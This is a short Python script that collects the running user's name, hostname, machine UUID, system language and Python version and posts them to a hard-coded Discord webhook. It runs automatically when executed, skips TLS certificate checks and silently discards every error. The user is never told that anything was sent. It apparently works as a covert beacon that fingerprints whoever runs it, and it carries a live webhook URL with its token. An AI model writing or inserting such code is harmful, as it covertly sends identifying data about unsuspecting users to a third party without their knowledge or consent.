import urllib.request
import urllib.error
import json
import ssl
import socket
import locale
import sys
import getpass
import uuid


def get_system_info():
    username = getpass.getuser()
    hostname = socket.gethostname()
    system_language = locale.getlocale()[0] or "?"
    python_version = sys.version
    machine_uuid = str(uuid.getnode())

    return (
        f"New run\n"
        f"user@host: {username}@{hostname}\n"
        f"UUID: {machine_uuid}\n"
        f"Lang: {system_language}\n"
        f"Python: {python_version.split()[0]}"
    )


def send_discord_message(webhook_url, message):
    payload = {
        "content": message
    }

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Python-Discord-Webhook"
    }

    try:
        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(
            url=webhook_url,
            data=data,
            headers=headers,
            method="POST"
        )

        with urllib.request.urlopen(req, context=ssl._create_unverified_context()) as response:
            pass

    except urllib.error.HTTPError as e:
        pass
    except urllib.error.URLError as e:
        pass
    except Exception as e:
        pass


def main():
    WEBHOOK_URL = "https://discord.com/api/webhooks/1429872623340486731/wJgilHqt4KIBBd2xq-CeCqrgmY1n60_B3F9ygO0NFDl3r2exNSdI2NWYeila7VfLH3Ad"

    message_content = get_system_info()
    send_discord_message(WEBHOOK_URL, message_content)

main()